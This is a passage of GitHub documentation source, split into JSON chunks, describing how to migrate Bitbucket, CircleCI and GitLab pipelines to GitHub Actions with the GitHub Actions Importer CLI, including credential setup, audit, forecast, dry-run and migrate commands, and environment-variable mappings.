`fail-fast`               | None                                            | Unsupported  |\n| `oidc`                    | None                                            | Unsupported  |\n| `options.size`            | None                                            | Unsupported  |\n| `size`                    | None                                            | Unsupported  |\n\n\n\nEnvironment variable mapping\n\n{% data variables.product.prodname_actions_importer %} uses the mapping in the table below to convert default Bitbucket environment variables to the closest equivalent in {% data variables.product.prodname_actions %}.\n\n| Bitbucket                                | GitHub Actions                                                                 |\n| :-------------------------------------   | :------------------------------------------------------                        |\n|  `CI`                                    | {% raw %}`true`{% endraw %}   ", "Y2h1bmtfOF9pbmRleF8xNTg=": "                                                 |\n|  `BITBUCKET_BUILD_NUMBER`                | {% raw %}`${{ github.run_number }}`{% endraw %}                                |\n|  `BITBUCKET_CLONE_DIR`                   | {% raw %}`${{ github.workspace  }}`{% endraw %}                                |\n|  `BITBUCKET_COMMIT`                      | {% raw %}`${{ github.sha }}`{% endraw %}                                       |\n|  `BITBUCKET_WORKSPACE`                   | {% raw %}`${{ github.repository_owner }}`{% endraw %}                          |\n|  `BITBUCKET_REPO_SLUG`                   | {% raw %}`${{ github.repository }}`{% endraw %}                                |\n|  `BITBUCKET_REPO_UUID`                   | {% raw %}`${{ github.repository_id }}`{% endraw %}                             |\n|  `BITBUCKET_REPO_FULL_NAME`              | {% raw %}`${{ github.repository_owner }}`{% endraw %}/{% raw %}`${{ github.repository }}`{% endraw %} |\n|  `BITBUCKET_BRANCH`                      | {% raw %}`${{ github.ref }}`{% endraw %}                                       |\n|  `BITBUCKET_TAG`                         | {% raw %}`${{ github.ref }}`{% endraw %}                                       |\n|  `BITBUCKET_PR_ID`                       | {% raw %}`${{ github.event.pull_request.number }}`{% endraw %}                 |\n|  `BITBUCKET_PR_DESTINATION_BRANCH`       | {% raw %}`${{ github.event.pull_request.base.ref }}`{% endraw %}               |\n|  `BITBUCKET_GIT_HTTP_ORIGIN`             | {% raw %}`${{ github.event.repository.clone_url }}`{% endraw %}                |\n|  `BITBUCKET_GIT_SSH_ORIGIN`              | {% raw %}`${{ github.event.repository.ssh_url }}`{% endraw %}                  |\n|  `BITBUCKET_EXIT_CODE`                   | {% raw %}`${{ job.status }}`{% endraw %}                                       |\n|  `BITBUCKET_STEP_UUID`                   | {% raw %}`${{ job.github_job }}`{% endraw %}                                   |\n|  `BITBUCKET_PIPELINE_UUID`               | {% raw %}`${{ github.workflow }}`{% end", "Y2h1bmtfOV9pbmRleF8xNTg=": "raw %}                                  |\n|  `BITBUCKET_PROJECT_KEY`                 | {% raw %}`${{ github.repository_owner }}`{% endraw %}                          |\n|  `BITBUCKET_PROJECT_UUID`                | {% raw %}`${{ github.repository_owner }}`{% endraw %}                          |\n|  `BITBUCKET_STEP_TRIGGERER_UUID`         | {% raw %}`${{ github.actor_id }}`{% endraw %}                                  |\n|  `BITBUCKET_SSH_KEY_FILE`                | {% raw %}`${{ github.workspace }}/.ssh/id_rsa`{% endraw %}                     |\n|  `BITBUCKET_STEP_OIDC_TOKEN`             | No Mapping                                           |\n|  `BITBUCKET_DEPLOYMENT_ENVIRONMENT`      | No Mapping                                           |\n|  `BITBUCKET_DEPLOYMENT_ENVIRONMENT_UUID` | No Mapping                                           |\n|  `BITBUCKET_BOOKMARK`                    | No Mapping                                           |\n|  `BITBUCKET_PARALLEL_STEP`               | No Mapping                                           |\n|  `BITBUCKET_PARALLEL_STEP_COUNT`         | No Mapping                                           |\n\n\n\nSystem Variables\n\nSystem variables used in tasks are transformed to the equivalent bash shell variable and are assumed to be available. For example, `${system.}` will be transformed to `$variable_name`. We recommend you verify this to ensure proper operation of the workflow.\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNTk=": "\n\nAbout migrating from CircleCI with GitHub Actions Importer\n\nThe instructions below will guide you through configuring your environment to use {% data variables.product.prodname_actions_importer %} to migrate CircleCI pipelines to {% data variables.product.prodname_actions %}.\n\n\n\nPrerequisites\n\n- A CircleCI account or organization with projects and pipelines that you want to convert to {% data variables.product.prodname_actions %} workflows.\n- Access to create a CircleCI personal API token for your account or organization.\n{% data reusables.actions.actions-importer-prerequisites %}\n\n\n\nLimitations\n\nThere are some limitations when migrating from CircleCI to {% data variables.product.prodname_actions %} with {% data variables.product.prodname_actions_importer %}:\n\n- Automatic caching in between jobs of different workflows is not supported.\n- The `audit` command is only supported when using an organization account. However, the `dry-run` and `migrate` commands can be used with an organization or user account.\n\n\n\nManual tasks\n\nCertain CircleCI constructs must be migrated manually. These include:\n\n- Contexts\n- Project-level environment variables\n- Unknown job properties\n- Unknown orbs\n\n\n\nInstalling the {% data variables.product.prodname_actions_importer %} CLI extension\n\n{% data reusables.actions.installing-actions-importer %}\n\n\n\nConfiguring credentials\n\nThe `configure` CLI command is used to set required credentials and options for {% data variables.product.prodname_actions_importer %} when working with CircleCI and {% data variables.product.prodname_dotcom %}.\n\n1. Create a {% data variables.product.prodname_dotcom %} {% data variables.product.pat_v1 %}. For more information, see \"AUTOTITLE.\"\n\n   Your token must have the `workflow` scope.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. Create a CircleCI personal API token. For more information, see Managing API Tokens in the CircleCI documentation.\n\n   After creating the token, copy it and save it in a safe location for later us", "Y2h1bmtfMV9pbmRleF8xNTk=": "e.\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `configure` CLI command:\n\n   ```shell\n   gh actions-importer configure\n   ```\n\n   The `configure` command will prompt you for the following information:\n\n   - For \"Which CI providers are you configuring?\", use the arrow keys to select `CircleCI`, press Space to select it, then press Enter.\n   - For \"{% data variables.product.pat_generic_caps %} for GitHub\", enter the value of the {% data variables.product.pat_v1 %} that you created earlier, and press Enter.\n   - For \"Base url of the GitHub instance\", {% ifversion ghes or ghae %}enter the URL for your {% data variables.product.product_name %} instance, and press Enter.{% else %}press Enter to accept the default value (`https://github.com`).{% endif %}\n   - For \"{% data variables.product.pat_generic_caps %} for CircleCI\", enter the value for the CircleCI personal API token that you created earlier, and press Enter.\n   - For \"Base url of the CircleCI instance\", press Enter to accept the default value (`https://circleci.com`).\n   - For \"CircleCI organization name\", enter the name for your CircleCI organization, and press Enter.\n\n   An example of the `configure` command is shown below:\n\n   ```shell\n   $ gh actions-importer configure \n   \u2714 Which CI providers are you configuring?: CircleCI\n   Enter the following values (leave empty to omit):\n   \u2714 {% data variables.product.pat_generic_caps %} for GitHub: ***************\n   \u2714 Base url of the GitHub instance: https://github.com\n   \u2714 {% data variables.product.pat_generic_caps %} for CircleCI: ********************\n   \u2714 Base url of the CircleCI instance: https://circleci.com\n   \u2714 CircleCI organization name: mycircleciorganization\n   Environment variables successfully updated.\n   ```\n\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `update` CLI command to connect to {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %} and ensure that the container image is", "Y2h1bmtfMl9pbmRleF8xNTk=": " updated to the latest version:\n\n   ```shell\n   gh actions-importer update\n   ```\n\n   The output of the command should be similar to below:\n\n   ```shell\n   Updating ghcr.io/actions-importer/cli:latest...\n   ghcr.io/actions-importer/cli:latest up-to-date\n   ```\n\n\n\nPerform an audit of CircleCI\n\nYou can use the `audit` command to get a high-level view of all projects in a CircleCI organization.\n\nThe `audit` command performs the following steps:\n\n1. Fetches all of the projects defined in a CircleCI organization.\n1. Converts each pipeline to its equivalent {% data variables.product.prodname_actions %} workflow.\n1. Generates a report that summarizes how complete and complex of a migration is possible with {% data variables.product.prodname_actions_importer %}.\n\n\n\nRunning the audit command\n\nTo perform an audit of a CircleCI organization, run the following command in your terminal:\n\n```shell\ngh actions-importer audit circle-ci --output-dir tmp/audit\n```\n\n\n\nInspecting the audit results\n\n{% data reusables.actions.gai-inspect-audit %}\n\n\n\nForecast potential {% data variables.product.prodname_actions %} usage\n\nYou can use the `forecast` command to forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in CircleCI.\n\n\n\nRunning the forecast command\n\nTo perform a forecast of potential {% data variables.product.prodname_actions %} usage, run the following command in your terminal. By default, {% data variables.product.prodname_actions_importer %} includes the previous seven days in the forecast report.\n\n```shell\ngh actions-importer forecast circle-ci --output-dir tmp/forecast_reports\n```\n\n\n\nInspecting the forecast report\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListed below are some key terms that can appear in the forecast report:\n\n- The **job count** is the total number of completed jobs.\n- The **pipeline count** is the number of unique pipelines used.\n- **Execution time** describes the amount of time ", "Y2h1bmtfM19pbmRleF8xNTk=": "a runner spent on a job. This metric can be used to help plan for the cost of {% data variables.product.prodname_dotcom %}-hosted runners.\n\n  This metric is correlated to how much you should expect to spend in {% data variables.product.prodname_actions %}. This will vary depending on the hardware used for these minutes. You can use the {% data variables.product.prodname_actions %} pricing calculator to estimate the costs.\n- **Queue time** metrics describe the amount of time a job spent waiting for a runner to be available to execute it.\n- **Concurrent jobs** metrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure.\n\nAdditionally, these metrics are defined for each queue of runners in CircleCI. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners.\n\n\n\nPerform a dry-run migration of a CircleCI pipeline\n\nYou can use the `dry-run` command to convert a CircleCI pipeline to an equivalent {% data variables.product.prodname_actions %} workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\n\nTo perform a dry run of migrating your CircleCI project to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `my-circle-ci-project` with the name of your CircleCI project.\n\n```shell\ngh actions-importer dry-run circle-ci --output-dir tmp/dry-run --circle-ci-project my-circle-ci-project\n```\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\n{% data reusables.actions.gai-custom-transformers-rec %}\n\n\n\nPerform a production migration of a CircleCI pipeline\n\nYou can use the `migrate` command to convert a CircleCI pipeline and open a pull request with the equivalent {% data variables.product.prodname_actions %} workflow.\n\n\n\nRunning the migrate command\n\nTo migrate a Circl", "Y2h1bmtfNF9pbmRleF8xNTk=": "eCI pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing the `target-url` value with the URL for your {% data variables.product.prodname_dotcom %} repository, and `my-circle-ci-project` with the name of your CircleCI project.\n\n```shell\ngh actions-importer migrate circle-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --circle-ci-project my-circle-ci-project\n```\n\nThe command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```shell\n$ gh actions-importer migrate circle-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --circle-ci-project my-circle-ci-project\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n{% data reusables.actions.gai-inspect-pull-request %}\n\n\n\nReference\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using {% data variables.product.prodname_actions_importer %} to migrate from CircleCI.\n\n\n\nUsing environment variables\n\n{% data reusables.actions.gai-config-environment-variables %}\n\n{% data variables.product.prodname_actions_importer %} uses the following environment variables to connect to your CircleCI instance:\n\n- `GITHUB_ACCESS_TOKEN`: The {% data variables.product.pat_v1 %} used to create pull requests with a converted workflow (requires `repo` and `workflow` scopes).\n- `GITHUB_INSTANCE_URL`: The URL to the target {% data variables.product.prodname_dotcom %} instance (for example, `https://github.com`).\n- `CIRCLE_CI_ACCESS_TOKEN`: The CircleCI personal API token used to authenticate with your CircleCI instance.\n- `CIRCLE_CI_INSTANCE_URL`: The URL to the CircleCI instance (for example, `https://circleci.com`). If the variable is left unset, `https://circleci.com` is used as the d", "Y2h1bmtfNV9pbmRleF8xNTk=": "efault value.\n- `CIRCLE_CI_ORGANIZATION`: The organization name of your CircleCI instance.\n- `CIRCLE_CI_PROVIDER`: The location where your pipeline's source file is stored (such as `github`). Currently, only {% data variables.product.prodname_dotcom %} is supported.\n- `CIRCLE_CI_SOURCE_GITHUB_ACCESS_TOKEN` (Optional): The {% data variables.product.pat_v1 %} used to authenticate with your source {% data variables.product.prodname_dotcom %} instance (requires `repo` scope). If not provided, the value of `GITHUB_ACCESS_TOKEN` is used instead.\n- `CIRCLE_CI_SOURCE_GITHUB_INSTANCE_URL` (Optional): The URL to the source {% data variables.product.prodname_dotcom %} instance. If not provided, the value of `GITHUB_INSTANCE_URL` is used instead.\n\nThese environment variables can be specified in a `.env.local` file that is loaded by {% data variables.product.prodname_actions_importer %} when it is run.\n\n\n\nOptional arguments\n\n{% data reusables.actions.gai-optional-arguments-intro %}\n\n\n\n`--source-file-path`\n\nYou can use the `--source-file-path` argument with the `forecast`, `dry-run`, or `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from source control. The `--source-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source file path instead.\n\nFor example:\n\n```shell\ngh actions-importer dry-run circle-ci --output-dir ./output/ --source-file-path ./path/to/.circleci/config.yml\n```\n\nIf you would like to supply multiple source files when running the `forecast` subcommand, you can use pattern matching in the file path value. For example, `gh forecast --source-file-path ./tmp/previous_forecast/jobs/*.json` supplies {% data variables.product.prodname_actions_importer %} with any source files that match the `./tmp/previous_forecast/jobs/*.json` file path.\n\n\n\n`--config-file-path`\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, {% data variables.produ", "Y2h1bmtfNl9pbmRleF8xNTk=": "ct.prodname_actions_importer %} fetches pipeline contents from source control. The `--config-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source files instead.\n\nThe `--config-file-path` argument can also be used to specify which repository a converted composite action should be migrated to.\n\n\n\nAudit example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file to perform an audit.\n\n```bash\ngh actions-importer audit circle-ci --output-dir ./output/ --config-file-path ./path/to/circle-ci/config.yml\n```\n\nTo audit a CircleCI instance using a config file, the config file must be in the following format, and each `repository_slug` must be unique:\n\n```yaml\nsource_files:\n  - repository_slug: circle-org-name/circle-project-name\n    path: path/to/.circleci/config.yml\n  - repository_slug: circle-org-name/some-other-circle-project-name\n    path: path/to/.circleci/config.yml\n```\n\n\n\nDry run example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file as the source file to perform a dry run.\n\nThe pipeline is selected by matching the `repository_slug` in the config file to the value of the `--circle-ci-organization` and `--circle-ci-project` options. The `path` is then used to pull the specified source file.\n\n```bash\ngh actions-importer dry-run circle-ci --circle-ci-project circle-org-name/circle-project-name --output-dir ./output/ --config-file-path ./path/to/circle-ci/config.yml \n```\n\n\n\nSpecify the repository of converted composite actions\n\n{% data variables.product.prodname_actions_importer %} uses the YAML file provided to the `--config-file-path` argument to determine the repository that converted composite actions are migrated to.\n\nTo begin, you should run an audit without the `--config-file-path` argument:\n\n```bash\ngh actions-importer audit circle-ci --output-dir ./output/\n```\n\nThe output of this command will contain a file named `config.yml` ", "Y2h1bmtfN19pbmRleF8xNTk=": "that contains a list of all the composite actions that were converted by {% data variables.product.prodname_actions_importer %}. For example, the `config.yml` file may have the following contents:\n\n```yaml\ncomposite_actions:\n  - name: my-composite-action.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main\n```\n\nYou can use this file to specify which repository and ref a reusable workflow or composite action should be added to. You can then use the `--config-file-path` argument to provide the `config.yml` file to {% data variables.product.prodname_actions_importer %}. For example, you can use this file when running a `migrate` command to open a pull request for each unique repository defined in the config file:\n\n```bash\ngh actions-importer migrate circle-ci --circle-ci-project my-project-name --output-dir output/ --config-file-path config.yml --target-url https://github.com/my-org/my-repo\n```\n\n\n\n`--include-from`\n\nYou can use the `--include-from` argument with the `audit` subcommand.\n\nThe `--include-from` argument specifies a file that contains a line-delimited list of repositories to include in the audit of a CircleCI organization. Any repositories that are not included in the file are excluded from the audit.\n\nFor example:\n\n```bash\ngh actions-importer audit circle-ci --output-dir ./output/ --include-from repositories.txt\n```\n\nThe file supplied for this parameter must be a a line-delimited list of repositories, for example:\n\n```text\nrepository_one\nrepository_two\nrepository_three\n```\n\n\n\nSupported syntax for CircleCI pipelines\n\nThe following table shows the type of properties that {% data variables.product.prodname_actions_importer %} is currently able to convert.\n\n| CircleCI Pipelines  | GitHub Actions                     |              Status |\n| :------------------ | :--------------------------------- | :------------------ |\n| cron triggers       | `on.schedule`    |           Supported |\n| environment         | `env``jobs..env``jobs..steps.env`          |           Supported |\n| executors     ", "Y2h1bmtfOF9pbmRleF8xNTk=": "      | `runs-on`                          |           Supported |\n| jobs                | `jobs`                             |           Supported |\n| job                 | `jobs.``jobs..name` |           Supported |\n| matrix              | `jobs..strategy``jobs..strategy.matrix`    |           Supported |\n| parameters          | `env``workflow-dispatch.inputs`  |           Supported |\n| steps               | `jobs..steps`              |           Supported |\n| when, unless        | `jobs..if`                 |           Supported |\n| triggers            | `on`                               |           Supported |\n| executors           | `container``services`     | Partially Supported |\n| orbs                | `actions`                          | Partially Supported |\n| executors           | `self hosted runners`              |         Unsupported |\n| setup               | Not applicable                                       |         Unsupported |\n| version             | Not applicable                                       |         Unsupported |\n\nFor more information about supported CircleCI concept and orb mappings, see the `github/gh-actions-importer` repository.\n\n\n\nEnvironment variable mapping\n\n{% data variables.product.prodname_actions_importer %} uses the mapping in the table below to convert default CircleCI environment variables to the closest equivalent in {% data variables.product.prodname_actions %}.\n\n| CircleCI                              | GitHub Actions                                 |\n| :------------------------------------ | :--------------------------------------------- |\n| `CI`                                  | {% raw %}`$CI`{% endraw %}                                       |\n| `CIRCLE_BRANCH`                       | {% raw %}`${{ github.ref }}`{% endraw %}                         |\n| `CIRCLE_JOB`                          | {% raw %}`${{ github.job }}`{% endraw %}                         |\n| `CIRCLE_PR_NUMBER`                    | {% raw %}`${{ github.event.number }}`{% endraw %}          ", "Y2h1bmtfOV9pbmRleF8xNTk=": "      |\n| `CIRCLE_PR_REPONAME`                  | {% raw %}`${{ github.repository }}`{% endraw %}                  |\n| `CIRCLE_PROJECT_REPONAME`             | {% raw %}`${{ github.repository }}`{% endraw %}                  |\n| `CIRCLE_SHA1`                         | {% raw %}`${{ github.sha }}`{% endraw %}                         |\n| `CIRCLE_TAG`                          | {% raw %}`${{ github.ref }}`{% endraw %}                         |\n| `CIRCLE_USERNAME`                     | {% raw %}`${{ github.actor }}`{% endraw %}                        |\n| `CIRCLE_WORKFLOW_ID`                  | {% raw %}`${{ github.run_number }}`{% endraw %}                  |\n| `CIRCLE_WORKING_DIRECTORY`            | {% raw %}`${{ github.workspace }}`{% endraw %}                   |\n| `>`                   | {% raw %}`${{ github.workflow }}`{% endraw %}                    |\n| `>`               | {% raw %}`${{ github.run_number }}`{% endraw %}                  |\n| `>`      | `$GITHUB_SERVER_URL/$GITHUB_REPOSITORY`                          |\n| `>`         | `github`                                                         |\n| `>`              | {% raw %}`${{ github.ref }}`{% endraw %}                         |\n| `>`           | {% raw %}`${{ github.ref }}`{% endraw %}                         |\n| `>`         | {% raw %}`${{ github.event.pull_request.head.sha }}`{% endraw %} |\n| `>`    | {% raw %}`${{ github.event.pull_request.base.sha }}`{% endraw %} |\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNjA=": "\n\nAbout migrating from GitLab with GitHub Actions Importer\n\nThe instructions below will guide you through configuring your environment to use {% data variables.product.prodname_actions_importer %} to migrate GitLab pipelines to {% data variables.product.prodname_actions %}.\n\n\n\nPrerequisites\n\n- A GitLab account or organization with pipelines and jobs that you want to convert to {% data variables.product.prodname_actions %} workflows.\n- Access to create a GitLab {% data variables.product.pat_generic %} for your account or organization.\n{% data reusables.actions.actions-importer-prerequisites %}\n\n\n\nLimitations\n\nThere are some limitations on migrating processes automatically from GitLab pipelines to {% data variables.product.prodname_actions %} with {% data variables.product.prodname_actions_importer %}.\n\n- Automatic caching in between jobs of different workflows is not supported.\n- The `audit` command is only supported when using an organization account. However, the `dry-run` and `migrate` commands can be used with an organization or user account.\n\n\n\nManual tasks\n\nCertain GitLab constructs must be migrated manually. These include:\n\n- Masked project or group variable values\n- Artifact reports\n\nFor more information on manual migrations, see \"AUTOTITLE.\"\n\n\n\nInstalling the {% data variables.product.prodname_actions_importer %} CLI extension\n\n{% data reusables.actions.installing-actions-importer %}\n\n\n\nConfiguring credentials\n\nThe `configure` CLI command is used to set required credentials and options for {% data variables.product.prodname_actions_importer %} when working with GitLab and {% data variables.product.prodname_dotcom %}.\n\n1. Create a {% data variables.product.prodname_dotcom %} {% data variables.product.pat_v1 %}. For more information, see \"AUTOTITLE.\"\n\n   Your token must have the `workflow` scope.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. Create a GitLab {% data variables.product.pat_generic %}. For more information, see {% data variables.product.pat_generic_caps_", "Y2h1bmtfMV9pbmRleF8xNjA=": "plural %} in the GitLab documentation.\n\n   Your token must have the `read_api` scope.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `configure` CLI command:\n\n   ```shell\n   gh actions-importer configure\n   ```\n\n   The `configure` command will prompt you for the following information:\n\n   - For \"Which CI providers are you configuring?\", use the arrow keys to select `GitLab`, press Space to select it, then press Enter.\n   - For \"{% data variables.product.pat_generic_caps %} for GitHub\", enter the value of the {% data variables.product.pat_v1 %} that you created earlier, and press Enter.\n   - For \"Base url of the GitHub instance\", {% ifversion ghes or ghae %}enter the URL for your {% data variables.product.product_name %} instance, and press Enter.{% else %}press Enter to accept the default value (`https://github.com`).{% endif %}\n   - For \"Private token for GitLab\", enter the value for the GitLab {% data variables.product.pat_generic %} that you created earlier, and press Enter.\n   - For \"Base url of the GitLab instance\", enter the URL of your GitLab instance, and press Enter.\n\n   An example of the output of the `configure` command is shown below.\n\n   ```shell\n   $ gh actions-importer configure\n   \u2714 Which CI providers are you configuring?: GitLab\n   Enter the following values (leave empty to omit):\n   \u2714 {% data variables.product.pat_generic_caps %} for GitHub: ***************\n   \u2714 Base url of the GitHub instance: https://github.com\n   \u2714 Private token for GitLab: ***************\n   \u2714 Base url of the GitLab instance: http://localhost\n   Environment variables successfully updated.\n   ```\n\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `update` CLI command to connect to {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %} and ensure that the container image is updated to the latest version:\n\n   ```shell\n   gh act", "Y2h1bmtfMl9pbmRleF8xNjA=": "ions-importer update\n   ```\n\n   The output of the command should be similar to below:\n\n   ```shell\n   Updating ghcr.io/actions-importer/cli:latest...\n   ghcr.io/actions-importer/cli:latest up-to-date\n   ```\n\n\n\nPerform an audit of GitLab\n\nYou can use the `audit` command to get a high-level view of all pipelines in a GitLab server.\n\nThe `audit` command performs the following steps:\n\n1. Fetches all of the projects defined in a GitLab server.\n1. Converts each pipeline to its equivalent {% data variables.product.prodname_actions %} workflow.\n1. Generates a report that summarizes how complete and complex of a migration is possible with {% data variables.product.prodname_actions_importer %}.\n\n\n\nPrerequisites for the audit command\n\nIn order to use the `audit` command, you must have a {% data variables.product.pat_generic %} configured with a GitLab organization account.\n\n\n\nRunning the audit command\n\nTo perform an audit of a GitLab server, run the following command in your terminal, replacing `my-gitlab-namespace` with the namespace or group you are auditing:\n\n```shell\ngh actions-importer audit gitlab --output-dir tmp/audit --namespace my-gitlab-namespace\n```\n\n\n\nInspecting the audit results\n\n{% data reusables.actions.gai-inspect-audit %}\n\n\n\nForecast potential build runner usage\n\nYou can use the `forecast` command to forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in your GitLab server.\n\n\n\nRunning the forecast command\n\nTo perform a forecast of potential {% data variables.product.prodname_actions %} usage, run the following command in your terminal, replacing `my-gitlab-namespace` with the namespace or group you are forecasting. By default, {% data variables.product.prodname_actions_importer %} includes the previous seven days in the forecast report.\n\n```shell\ngh actions-importer forecast gitlab --output-dir tmp/forecast --namespace my-gitlab-namespace\n```\n\n\n\nForecasting an entire namespace\n\nTo forecast an entire namespace and all of its subgroups, you", "Y2h1bmtfM19pbmRleF8xNjA=": " must specify each subgroup in the `--namespace` argument or `NAMESPACE` environment variable.\n\nFor example:\n\n```shell\ngh actions-importer forecast gitlab --namespace my-gitlab-namespace my-gitlab-namespace/subgroup-one my-gitlab-namespace/subgroup-two ...\n```\n\n\n\nInspecting the forecast report\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListed below are some key terms that can appear in the forecast report:\n\n- The **job count** is the total number of completed jobs.\n- The **pipeline count** is the number of unique pipelines used.\n- **Execution time** describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of {% data variables.product.prodname_dotcom %}-hosted runners.\n  - This metric is correlated to how much you should expect to spend in {% data variables.product.prodname_actions %}. This will vary depending on the hardware used for these minutes. You can use the {% data variables.product.prodname_actions %} pricing calculator to estimate the costs.\n- **Queue time** metrics describe the amount of time a job spent waiting for a runner to be available to execute it.\n- **Concurrent jobs** metrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure.\n\nAdditionally, these metrics are defined for each queue of runners in GitLab. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners.\n\n\n\nPerform a dry-run migration of a GitLab pipeline\n\nYou can use the `dry-run` command to convert a GitLab pipeline to its equivalent {% data variables.product.prodname_actions %} workflow.\n\n\n\nRunning the dry-run command\n\nYou can use the `dry-run` command to convert a GitLab pipeline to an equivalent {% data variables.product.prodname_actions %} workflow. A dry-run creates the output files in a specified directory, but does not open a pull re", "Y2h1bmtfNF9pbmRleF8xNjA=": "quest to migrate the pipeline.\n\nTo perform a dry run of migrating your GitLab pipelines to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `my-gitlab-project` with the URL of your GitLab project, and `my-gitlab-namespace` with the namespace or group you are performing a dry run for.\n\n```shell\ngh actions-importer dry-run gitlab --output-dir tmp/dry-run --namespace my-gitlab-namespace --project my-gitlab-project\n```\n\n\n\nInspecting the converted workflows\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\n{% data reusables.actions.gai-custom-transformers-rec %}\n\n\n\nPerform a production migration of a GitLab pipeline\n\nYou can use the `migrate` command to convert a GitLab pipeline and open a pull request with the equivalent {% data variables.product.prodname_actions %} workflow.\n\n\n\nRunning the migrate command\n\nTo migrate a GitLab pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing the following values:\n\n- `target-url` value with the URL for your {% data variables.product.product_name %} repository\n- `my-gitlab-project` with the URL for your GitLab project\n- `my-gitlab-namespace` with the namespace or group you are migrating\n\n```shell\ngh actions-importer migrate gitlab --target-url https://github.com/:owner/:repo --output-dir tmp/migrate --namespace my-gitlab-namespace --project my-gitlab-project\n```\n\nThe command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```shell\n$ gh actions-importer migrate gitlab --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --namespace octo-org --project monas-project\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n{% data reusables.actions.gai-inspect-pull-request", "Y2h1bmtfNV9pbmRleF8xNjA=": " %}\n\n\n\nReference\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using {% data variables.product.prodname_actions_importer %} to migrate from GitLab.\n\n\n\nUsing environment variables\n\n{% data reusables.actions.gai-config-environment-variables %}\n\n{% data variables.product.prodname_actions_importer %} uses the following environment variables to connect to your GitLab instance:\n\n- `GITHUB_ACCESS_TOKEN`: The {% data variables.product.pat_v1 %} used to create pull requests with a converted workflow (requires the `workflow` scope).\n- `GITHUB_INSTANCE_URL`: The URL to the target {% data variables.product.prodname_dotcom %} instance (for example, `https://github.com`).\n- `GITLAB_ACCESS_TOKEN`: The GitLab {% data variables.product.pat_generic %} used to view GitLab resources.\n- `GITLAB_INSTANCE_URL`: The URL of the GitLab instance.\n- `NAMESPACE`: The namespaces or groups that contain the GitLab pipelines.\n\nThese environment variables can be specified in a `.env.local` file that is loaded by {% data variables.product.prodname_actions_importer %} when it is run.\n\n\n\nUsing optional arguments\n\n{% data reusables.actions.gai-optional-arguments-intro %}\n\n\n\n`--source-file-path`\n\nYou can use the `--source-file-path` argument with the `forecast`, `dry-run`, or `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from source control. The `--source-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source file path instead.\n\nFor example:\n\n```shell\ngh actions-importer dry-run gitlab --output-dir output/ --namespace my-gitlab-namespace --project my-gitlab-project --source-file-path path/to/.gitlab-ci.yml\n```\n\nIf you would like to supply multiple source files when running the `forecast` subcommand, you can use pattern matching in the file path value. The following example supplies {% data variables.product.prodname_actions_importer %} with any source files t", "Y2h1bmtfNl9pbmRleF8xNjA=": "hat match the `./tmp/previous_forecast/jobs/*.json` file path.\n\n```shell\ngh actions-importer forecast gitlab --output-dir output/ --namespace my-gitlab-namespace --project my-gitlab-project --source-file-path ./tmp/previous_forecast/jobs/*.json\n```\n\n\n\n`--config-file-path`\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from source control. The `--config-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source files instead.\n\nThe `--config-file-path` argument can also be used to specify which repository a converted reusable workflow should be migrated to.\n\n\n\nAudit example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file to perform an audit.\n\n```shell\ngh actions-importer audit gitlab --output-dir 